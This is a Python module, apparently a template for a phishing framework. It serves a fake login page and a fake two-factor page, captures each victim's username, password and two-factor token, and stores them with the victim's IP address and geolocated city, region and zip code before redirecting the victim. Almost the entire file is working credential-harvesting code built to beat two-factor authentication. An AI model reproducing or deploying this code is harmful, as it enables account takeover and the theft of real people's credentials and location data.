from __future__ import print_function
from flask import redirect, request, jsonify, Markup
from os import system
from core import functions
from core.base_module import *
import uuid
import mechanicalsoup
import bs4
import re, sys, time, random
import time
import json

class ExampleModule(BaseModule):
    def __init__(self, enable_2fa=False):
        super().__init__(self)

        self.set_name('example')
        self.add_route('main', '/')
        self.add_route('twofactor', '/twofactor')
        self.add_route('redirect', '/redirect')
        self.enable_two_factor(enable_2fa)

    def main(self):
        next_url = '/twofactor'
        template = self.env.get_template('login.html')

        return template.render(
            next_url=next_url,
            hostname=request.host,
        )


    def twofactor(self):
        self.user = request.values.get('username')
        self.password = request.values.get('password')
        next_url = '/redirect'

        functions.cache_creds(self.name, self.user, self.password)

        template = self.env.get_template('twofactor.html')

        return template.render(
            hostname=request.host,
            next_url=next_url,
            username=self.user,
            password=self.password,
        )


    def redirect(self):
        self.user = request.values.get('username')
        self.password = request.values.get('password')
        self.two_factor_token = request.values.get('two_factor_token')
        self.two_factor_type = request.values.get('two_factor_type')

        city, region, zip_code = '','',''
        try:
            geoip_url = 'https://freegeoip.net/json/{}'.format(
                request.remote_addr
            )
            geo_browser = mechanicalsoup.StatefulBrowser()
            geo_response = geo_browser.open(geoip_url)
            geo = json.loads(geo_response.text)
            city = geo['city']
            region = geo['region_name']
            zip_code = geo['zip_code']
        except Exception as ex:
            pass

        functions.store_creds(
            self.name,
            self.user,
            self.password,
            self.two_factor_token,
            self.two_factor_type,
            request.remote_addr,
            city,
            region,
            zip_code
        )
        return redirect(self.final_url, code=302)


def load(enable_2fa=False):
    return ExampleModule(enable_2fa)

